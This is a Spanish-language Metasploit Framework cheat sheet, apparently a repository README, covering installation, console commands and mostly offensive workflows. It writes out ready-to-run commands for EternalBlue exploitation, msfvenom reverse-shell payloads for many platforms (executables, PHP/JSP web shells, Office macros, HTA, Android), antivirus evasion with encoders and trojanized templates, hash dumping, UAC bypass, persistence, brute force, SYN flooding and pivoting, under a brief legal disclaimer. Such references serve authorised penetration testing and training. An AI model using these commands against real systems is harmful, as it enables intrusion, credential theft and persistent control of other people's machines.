# 🔴 Metasploit Framework - Guía rápida completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![Licencia](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **El framework de pruebas de penetración más utilizado del mundo** - Tu guía completa para dominar Metasploit

---

## 📋 Índice

- [Introducción](#-introducción)
- [Instalación](#-instalación)
- [Descripción de la arquitectura](#-descripción-de-la-arquitectura)
- [Inicio de Metasploit](#-inicio-de-metasploit)
- [Comandos básicos](#-comandos-básicos)
- [Tipos de módulos](#-tipos-de-módulos)
- [Flujo de explotación](#-flujo-de-explotación)
- [Integración con la base de datos](#-integración-con-la-base-de-datos)
- [Escaneo y enumeración](#-escaneo-y-enumeración)
- [Generación de payloads (msfvenom)](#-generación-de-payloads-msfvenom)
- [Posexplotación](#-posexplotación)
- [Módulos auxiliares](#-módulos-auxiliares)
- [Ejemplos prácticos](#-ejemplos-prácticos)
- [Tablas de referencia rápida](#-tablas-de-referencia-rápida)
- [Consejos y buenas prácticas](#-consejos-y-buenas-prácticas)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**Metasploit Framework** es una plataforma de código abierto para realizar pruebas de penetración y desarrollar exploits. Ofrece:

- 🔍 **Recopilación de información** y escaneo de vulnerabilidades
- 💉 **Desarrollo de exploits** y ejecución
- 🎭 **Generación de payloads** para distintas plataformas
- 🔐 Herramientas y técnicas de **posexplotación**
- 📊 Funciones de **elaboración de informes** y documentación

### Componentes principales

| Componente | Descripción |
|-----------|-------------|
| `msfconsole` | Interfaz principal de línea de comandos |
| `msfvenom` | Generador y codificador de payloads |
| `msfdb` | Utilidad de gestión de la base de datos |
| `msfrpcd` | Servicio RPC para acceso remoto |

---

## 📥 Instalación

### Kali Linux (preinstalado)
```bash
# Actualizar Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Instalar las dependencias
sudo apt install curl gnupg2 software-properties-common

# Añadir el repositorio de Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (no recomendado para producción)
```powershell
# Descargar el instalador desde: https://windows.metasploit.com/
# Ejecutar el instalador y seguir las instrucciones
```

---

<a id="-descripción-de-la-arquitectura"></a>
## 🏗️ Descripción de la arquitectura

```
┌──────────────────────────────────────────────────────────────────────┐
│                         METASPLOIT FRAMEWORK                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │   EXPLOITS  │  │   PAYLOADS  │  │  AUXILIARES │  │     POST    │  │
│  │   (~2000)   │  │    (~500)   │  │   (~1000)   │  │    (~400)   │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘  │
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │CODIFICADORES│  │     NOPS    │  │   EVASIÓN   │  │   PLUGINS   │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘  │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│                              INTERFACES                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  │
│  │  msfconsole │  │   Armitage  │  │     API     │  │     RPC     │  │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────┘  │
├──────────────────────────────────────────────────────────────────────┤
│                      BASE DE DATOS (PostgreSQL)                      │
└──────────────────────────────────────────────────────────────────────┘
```

> **Nota de versión:** las cantidades de módulos del diagrama son aproximaciones históricas del original, no un inventario de la versión instalada.

### Estructura de directorios
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Módulos de explotación
│   ├── payloads/      # Módulos de payloads
│   ├── auxiliary/     # Escaneo, fuzzing, etc.
│   ├── post/          # Posexplotación
│   ├── encoders/      # Codificadores de payloads
│   ├── nops/          # Generadores de NOP
│   └── evasion/       # Módulos de evasión de antivirus
├── tools/             # Herramientas adicionales
├── scripts/           # Scripts de Meterpreter
├── data/              # Listas de palabras y plantillas
└── plugins/           # Plugins de la consola
```

---

## 🚀 Inicio de Metasploit

### Inicializar la base de datos (primera vez)
```bash
# Iniciar el servicio PostgreSQL
sudo systemctl start postgresql

# Inicializar la base de datos
sudo msfdb init

# Comprobar el estado de la base de datos
sudo msfdb status
```

### Iniciar msfconsole
```bash
# Inicio estándar
msfconsole

# Modo silencioso (sin banner)
msfconsole -q

# Ejecutar comandos al iniciar
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Cargar un archivo de recursos
msfconsole -r commands.rc
```

---

<a id="-comandos-básicos"></a>
## ⌨️ Comandos básicos

### Navegación y ayuda

| Comando | Descripción |
|---------|-------------|
| `help` o `?` | Mostrar el menú de ayuda |
| `help <command>` | Ayuda de un comando concreto |
| `search <term>` | Buscar módulos por nombre, CVE o plataforma |
| `use <module>` | Seleccionar un módulo |
| `back` | Salir del módulo actual |
| `info` | Mostrar información del módulo |
| `show options` | Mostrar las opciones del módulo |
| `show advanced` | Mostrar las opciones avanzadas |
| `show payloads` | Listar los payloads compatibles |
| `show targets` | Listar los objetivos disponibles |

### Configuración del módulo

```bash
# Establecer las opciones
set RHOSTS 192.168.1.100          # IP del objetivo
set RPORT 445                      # Puerto del objetivo
set LHOST 192.168.1.50            # IP local (atacante)
set LPORT 4444                     # Puerto local (listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Establecer globalmente (se mantiene entre módulos)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Eliminar valores de opciones
unset RHOSTS
unsetg LHOST

# Comprobar la configuración actual
show options
check                              # Comprobar si el objetivo es vulnerable
```

### Ejecución

```bash
# Ejecutar el exploit
exploit
run

# Ejecutar en segundo plano
exploit -j

# Ejecutar con opciones específicas
exploit -z                         # No interactuar con la sesión tras el éxito
```

### Gestión de sesiones

```bash
# Listar las sesiones
sessions
sessions -l

# Interactuar con una sesión
sessions -i 1

# Cerrar una sesión
sessions -k 1

# Cerrar todas las sesiones
sessions -K

# Convertir una shell en una sesión Meterpreter
sessions -u 1

# Ejecutar un comando en todas las sesiones
sessions -c "sysinfo"
```

---

## 📦 Tipos de módulos

### 1. Exploits
Módulos que aprovechan vulnerabilidades.

```bash
# Buscar exploits
search type:exploit platform:windows

# Ejemplo
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Código que se ejecuta después de una explotación exitosa.

**Tipos:**
- **Singles** - Payloads autónomos
- **Stagers** - Establecen la conexión entre el atacante y el objetivo
- **Stages** - Componentes que descargan los stagers (Meterpreter)

```bash
# Listar los payloads
show payloads

# Convención de nombres de payloads
<platform>/<arch>/<type>/<connection>
# Ejemplo: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliares (Auxiliary)
Escaneo, fuzzing (pruebas con entradas variadas), captura de tráfico y otras funciones.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Módulos de posexplotación.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Codificadores (Encoders)
Codifican payloads con el propósito de dificultar su detección.

> **Aclaración:** su finalidad principal es evitar caracteres no válidos en un exploit. Codificar o repetir la codificación no garantiza evadir antivirus; véase la [documentación de Rapid7](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/).

```bash
show encoders
# Ejemplo: x86/shikata_ga_nai
```

---

## 🎯 Flujo de explotación

```
┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  RECONOCIMIENTO  │───▶│   SELECCIONAR    │───▶│    CONFIGURAR    │
│  Y ENUMERACIÓN   │    │      MÓDULO      │    │     OPCIONES     │
└──────────────────┘    └──────────────────┘    └──────────────────┘
                                                          │
                                                          ▼
┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  POSEXPLOTACIÓN  │◀───│     EXPLOTAR     │◀───│    COMPROBAR     │
│                  │    │     OBJETIVO     │    │     OBJETIVO     │
└──────────────────┘    └──────────────────┘    └──────────────────┘
```

### Ejemplo paso a paso

```bash
# 1. Buscar el exploit
msf6 > search eternalblue

# 2. Seleccionar el módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver las opciones
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Establecer el objetivo
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Establecer el payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Configurar el listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verificar la vulnerabilidad (opcional)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Ejecutar
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-integración-con-la-base-de-datos"></a>
## 🗄️ Integración con la base de datos

### Configuración y conexión

```bash
# Inicializar la base de datos
msfdb init

# Conectarse a la base de datos
db_connect msf:password@127.0.0.1/msf

# Comprobar el estado
db_status

# Desconectar
db_disconnect
```

### Gestión de espacios de trabajo (workspaces)

```bash
# Listar los espacios de trabajo
workspace

# Crear un espacio de trabajo
workspace -a pentest_project

# Cambiar de espacio de trabajo
workspace pentest_project

# Eliminar un espacio de trabajo
workspace -d old_project

# Cambiar el nombre de un espacio de trabajo
workspace -r old_name new_name
```

### Gestión de hosts

```bash
# Listar los hosts
hosts

# Añadir un host manualmente
hosts -a 192.168.1.100

# Eliminar un host
hosts -d 192.168.1.100

# Buscar hosts
hosts -S windows

# Exportar los hosts
hosts -o /tmp/hosts.csv
```

### Gestión de servicios

```bash
# Listar los servicios
services

# Filtrar por puerto
services -p 80,443

# Filtrar por nombre de servicio
services -s http

# Buscar servicios
services -S microsoft
```

### Gestión de vulnerabilidades

```bash
# Listar las vulnerabilidades
vulns

# Añadir una vulnerabilidad
vulns -a 192.168.1.100 -n "MS17-010"
```

### Importación y exportación

```bash
# Importar un escaneo de Nmap
db_import /path/to/nmap_scan.xml

# Importar un escaneo de Nessus
db_import /path/to/nessus_scan.nessus

# Ejecutar Nmap directamente
db_nmap -sV -O 192.168.1.0/24

# Exportar los datos
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Escaneo y enumeración

### Escaneo de puertos

```bash
# Escaneo TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Escaneo TCP connect
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Enumeración de servicios

```bash
# Enumeración de SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Recursos compartidos SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Versión de SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Versión de HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Enumeración de FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Escaneo de vulnerabilidades

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Escáner de vulnerabilidades HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Generación de payloads (msfvenom)

### Sintaxis básica
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Opciones habituales

| Opción | Descripción |
|--------|-------------|
| `-p` | Payload que se utilizará |
| `-f` | Formato de salida |
| `-o` | Archivo de salida |
| `-e` | Codificador que se utilizará |
| `-i` | Iteraciones de codificación |
| `-b` | Caracteres no válidos (bad characters) que se deben evitar |
| `-n` | Tamaño de la secuencia NOP (NOP sled) |
| `--platform` | Plataforma objetivo |
| `-a` | Arquitectura |
| `LHOST` | IP del listener (receptor de conexiones) |
| `LPORT` | Puerto del listener |

### Payloads para Windows

```bash
# TCP inverso (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# TCP inverso (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# HTTPS inverso (cifrado)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# TCP bind (a la escucha)
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Con codificación (evasión de antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Payloads para Linux

```bash
# TCP inverso
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# TCP inverso (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Shell bind (a la escucha)
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Payloads web

```bash
# Shell inversa PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Shell inversa ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Shell inversa ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Shell inversa JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# Archivo WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Payloads en lenguajes de scripting

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Payloads para Android

```bash
# TCP inverso para Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Payloads para macOS

```bash
# TCP inverso para macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Configuración de Multi/Handler

```bash
# Iniciar el listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Posexplotación

### Módulos básicos de posexplotación

```bash
# Obtener información del sistema
use post/windows/gather/enum_system

# Obtener los usuarios con sesión iniciada
use post/windows/gather/enum_logged_on_users

# Volcar los hashes de contraseñas
use post/windows/gather/hashdump

# Credenciales en memoria
use post/windows/gather/credentials/credential_collector

# Comprobar si es una máquina virtual
use post/windows/gather/checkvm
```

### Escalada de privilegios

```bash
# Sugerencias de escalada de privilegios en Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Elusión de UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Obtener SYSTEM
use post/windows/escalate/getsystem
```

### Persistencia

```bash
# Persistencia mediante el registro
use exploit/windows/local/persistence_service
set SESSION 1
run

# Persistencia mediante tareas programadas
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Módulos auxiliares

### Fuerza bruta

```bash
# Fuerza bruta contra SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Fuerza bruta contra SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Fuerza bruta contra FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Captura de tráfico (sniffing)

```bash
# Capturador de contraseñas HTTP
use auxiliary/sniffer/psnuffle
run

# Capturar paquetes
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (solo para pruebas)

```bash
# Inundación SYN
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Ejemplos prácticos

### Ejemplo 1: ataque EternalBlue (MS17-010)

```bash
# Iniciar Metasploit
msfconsole -q

# Buscar el exploit
search eternalblue

# Utilizar el exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Comprobar si es vulnerable
check

# Explotar
exploit
```

### Ejemplo 2: ataque a una aplicación web

```bash
# Buscar vulnerabilidades
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Explotar la subida de archivos
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Ejemplo 3: Multi-Handler con msfvenom

```bash
# Terminal 1: generar el payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: iniciar el handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Transferir payload.exe al objetivo y ejecutarlo
# La sesión se conectará al handler
```

### Ejemplo 4: pivoting a través de un host comprometido

```bash
# Después de obtener una sesión Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# O desde msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Escanear ahora la red interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Tablas de referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `search <term>` | Buscar módulos |
| `use <module>` | Seleccionar un módulo |
| `show options` | Mostrar las opciones |
| `set <opt> <val>` | Establecer el valor de una opción |
| `exploit` / `run` | Ejecutar el módulo |
| `back` | Volver a la consola principal |
| `sessions -l` | Listar las sesiones |
| `sessions -i <id>` | Interactuar con una sesión |

### Payloads habituales

| Payload | Descripción |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Meterpreter para Windows (32 bits) |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter para Windows (64 bits) |
| `windows/meterpreter/reverse_https` | Conexión cifrada |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter para Linux |
| `php/meterpreter/reverse_tcp` | Meterpreter para PHP |
| `java/jsp_shell_reverse_tcp` | Shell Java/JSP |
| `android/meterpreter/reverse_tcp` | Meterpreter para Android |

### Formatos de salida (msfvenom)

| Formato | Extensión | Caso de uso |
|--------|-----------|----------|
| `exe` | .exe | Ejecutable de Windows |
| `elf` | (ninguna) | Ejecutable de Linux |
| `macho` | (ninguna) | Ejecutable de macOS |
| `raw` | variable | Shellcode sin formato |
| `asp` | .asp | Servidor web IIS |
| `aspx` | .aspx | Servidor web .NET |
| `php` | .php | Servidor web PHP |
| `jsp` | .jsp | Servidor web Java |
| `war` | .war | Despliegue en Tomcat |
| `psh` | .ps1 | Script de PowerShell |
| `vba` | .vba | Macro de Office |
| `dll` | .dll | Biblioteca de Windows |

### Codificadores habituales

| Codificador | Descripción |
|---------|-------------|
| `x86/shikata_ga_nai` | Codificador XOR polimórfico |
| `x64/xor` | Codificador XOR (64 bits) |
| `x86/alpha_mixed` | Codificador alfanumérico |
| `php/base64` | Codificador Base64 de PHP |

---

## 💡 Consejos y buenas prácticas

### ⚠️ Aviso legal
> **IMPORTANTE:** utiliza Metasploit únicamente en sistemas de tu propiedad o para los que tengas autorización expresa por escrito. El acceso no autorizado a sistemas informáticos es ilegal.

### Consejos de rendimiento

1. **Utilizar la base de datos**
   ```bash
   # Inicializar y utilizar siempre la base de datos
   msfdb init
   db_status
   ```

2. **Utilizar espacios de trabajo**
   ```bash
   workspace -a client_pentest
   ```

3. **Scripts de recursos**
   ```bash
   # Guardar los comandos en un archivo .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Ejecutar el script
   msfconsole -r handler.rc
   ```

4. **Utilizar los hilos con criterio**
   ```bash
   set THREADS 10  # No sobrecargar el objetivo
   ```

### Técnicas de evasión

1. **Múltiples codificaciones**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Plantillas personalizadas**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Utilizar payloads HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

> **Compatibilidad:** los ejemplos reflejan versiones y módulos del original. Comprueba `search`, `info` y `show options` en tu instalación antes de reutilizarlos. En particular, la persistencia mediante servicios y ejecutables no equivale necesariamente a persistencia en el registro o mediante tareas programadas, como sugieren algunos comentarios originales.

### Resolución de problemas

| Problema | Solución |
|-------|----------|
| La base de datos no conecta | `msfdb reinit` |
| El módulo no se carga | `reload_all` |
| La sesión se cierra de inmediato | Comprobar el antivirus y utilizar un payload codificado |
| El exploit falla | Comprobar la versión del sistema operativo objetivo y probar otro objetivo compatible |

---

> **Efecto de `reinit`:** reinicializa la base de datos; no lo trates como una simple reconexión y conserva los datos del proyecto antes de considerar esa acción.

## 📚 Recursos

### Documentación oficial
- [Documentación de Metasploit](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

### Recursos de aprendizaje
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Guías rápidas
- [Guía rápida de Metasploit de SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Guía rápida de Meterpreter](./Meterpreter.es.md)

---

## 📄 Licencia

Esta guía se proporciona únicamente con fines educativos. Utilízala con responsabilidad y ética.

---

<p align="center">
  <b>¡Buen hacking! 🔴</b><br>
  <i>Recuerda: un gran poder conlleva una gran responsabilidad</i>
</p>
